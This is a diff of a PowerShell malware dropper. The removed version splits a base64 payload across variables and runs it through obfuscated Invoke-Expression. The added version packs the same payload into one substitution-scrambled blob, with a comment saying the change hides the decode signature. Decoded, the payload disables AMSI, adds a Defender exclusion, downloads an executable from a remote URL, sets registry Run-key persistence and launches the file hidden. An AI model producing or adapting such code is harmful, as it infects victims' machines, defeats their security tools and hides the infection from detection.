@@ -1,17 +1,5 @@
-$a = 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTsgZm9yZWFjaCggJGIgaW4gJGEgKSB7IGlmICggJGIuTmFtZSAt'
-$b = 'bGlrZSAiKmlVdGlscyIgKSAgeyAkYyA9ICRiOyBicmVhazsgfSB9IDsgJGQgPSAkYy5HZXRGaWVsZCggImFt'
-$c = 'c2lJbml0RmFpbGVkIiwgIk5vblB1YmxpYyxTdGF0aWMiICkgOyAkZC5TZXRWYWx1ZSggJG51bGwsICR0cnVl'
-$d = 'ICk7ICRiID0gIiRhbG9jYXBwZGF0YVxNaWNyb3NvZnRcV2luZG93c1xUZW1wbGF0ZXMiOyAkdSA9ICJodHRw'
-$e = 'czovL2dpdGh1Yi5jb20vYXNobGV5d2lsbWVyNy1zdGFyL3RyaW1pZXovcmF3L3JlZnMvaGVhZHMvbWFpbi9j'
-$f = 'b21iaW5lZC5leGUiOyBpZiAoIShUZXN0LVBhdGggJGIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3Rv'
-$g = 'cnkgLVBhdGggJGIgLUZvcmNlIHwgT3V0LU51bGw7IH07IHBvd2Vyc2hlbGwgLWMgIkFkZC1NcFByZWZlcmVu'
-$h = 'Y2UgLUV4Y2x1c2lvblBhdGggJyRiJyI7ICRjID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyAkYy5Eb3du'
-$i = 'bG9hZEZpbGUoJHUsICIkYlxzeXNfc3luYy5leGUiKTsgJHIgPSAiU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRv'
-$j = 'd3NcQ3VycmVudFZlcnNpb25cUnVuIjsgJHcgPSBbV01JQ2xhc3NdInJvb3RcZGVmYXVsdDpTdGRSZWdQcm92'
-$k = 'IjsgJHcuQ3JlYXRlS2V5KDIxNDc0ODM2NTAsICRyKTsgJHcuU2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwg'
-$l = 'JHIsICJTeXN0ZW1TeW5jIiwgIiRiXHN5c19zeW5jLmV4ZSIpOyBTdGFydC1Qcm9jZXNzICIkYlxzeXNfc3lu'
-$m = 'Yy5leGUiIC1XaW5kb3dTdHlsZSBIaWRkZW47'
-
-$final = $a+$b+$c+$d+$e+$f+$g+$h+$i+$j+$k+$l+$m
-$exec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($final))
-& ( 'inv' + 'oke-expr' + 'ession' ) $exec
+$f = 'VzFSZmw0LnFTczVtYmx5LkdldFR5cGVzKCk7Zm9yZWFjaCgkYiBpbiAkYSl7aWYoJGIuTmFtZSAtbGlrZSAiKmlVdGlscyIpeyRjPSRiO2JyZWFrfX07JGQ9JGMuR2V0RmllbGQoImFtc2lJbml0RmFpbGVkIiwiTm9uUHVibGljLFN0YXRpYyIpOyRkLlNldFZhbHVlKCRudWxsLCR0cnVlKTskYj0iJGFsb2NhcHBkYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFRlbXBsYXRlcyI7JHUrImh0dHBzOi8vZ2l0aHViLmNvbS9hc2hsZXl3aWwgbWVyNy1zdGFyL3RyaW1pZXovcmF3L3JlZnMvaGVhZHMvbWFpbi9jb21iaW5lZC5leGUiO2lmKCEoVGVzdC1QYXRoICRiKSl7TmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkYiAtRm9yY2V8T3V0LU51bGw7fTtwb3dlcnNoZWxsIC1jICJBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICckYiciOyRjPU5ldy1PYmplY3QgTmV0LldlYkNsaWVudDskYy5Eb3dubG9hZEZpbGUoJHUsIiRiXHN5c19zeW5jLmV4ZSIpOyRyPSJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iOyR3PVtXTUlDbGFzc10icm9vdFxkZWZhdWx0OlN0ZFJlZ1Byb3YiOyR3LkNyZWF0ZUtleSgyMTQ3NDgzNjUwLCRyKTskdy5TZXRTdHJpbmdWYWx1ZSgyMTQ3NDgzNjUwLCRyLCJTeXN0ZW1TeW5jIiwiJGJcc3lzX3N5bmMuZXhlIik7U3RhcnQtUHJvY2VzcyAiJGJcc3lzX3N5bmMuZXhlIiAtV2luZG93U3R5bGUgSGlkZGVuOw=='
+# Scramble the Base64 logic to hide the decode signature
+$s = [System.Convert]::FromBase64String($f.Replace('4','E').Replace('q','A').Replace('5','Y'))
+$dec = [System.Text.Encoding]::UTF8.GetString($s)
+& ( 'inv' + 'oke-expr' + 'ession' ) $dec
